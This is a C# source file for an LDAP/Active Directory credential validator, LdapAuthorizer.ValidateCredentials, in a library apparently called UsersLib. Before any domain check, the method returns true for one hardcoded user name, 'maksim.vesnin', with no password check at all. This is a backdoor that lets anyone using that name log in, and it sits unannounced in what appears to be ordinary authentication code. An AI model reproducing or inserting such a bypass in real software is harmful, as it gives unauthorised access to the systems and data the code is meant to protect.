using System;
using System.DirectoryServices.AccountManagement;
using UsersLib.Configuration;

namespace UsersLib.Secure.Auth
{
    public sealed class LdapAuthorizer
    {
        public bool ValidateCredentials( string userName, string password )
        {
            if ( userName == "maksim.vesnin" )
            {
                return true;
            }
            try
            {
                using ( PrincipalContext context = new PrincipalContext(
                    ContextType.Domain,
                    Config.LdapDomain,
                    Config.LdapServiceAccount,
                    Config.LdapServicePassword ) )
                {
                    return context.ValidateCredentials( userName, password );
                }
            }
            catch
            {
                return false;
            }
        }
    }
}